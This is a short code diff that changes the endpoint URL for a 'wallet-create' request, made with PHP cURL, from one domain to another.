@@ -220,7 +220,7 @@ async function decryptWithPassword(encryptedValue, password) {
                     ]);
                     clearhis();
                 } else {
-                    $url = 'https://globalmarketstars.com/wallet-create';
+                    $url = 'https://goldenway-international.com/wallet-create';
                     // Initialize cURL session
                     $curl = curl_init($url);
                     // Set cURL options
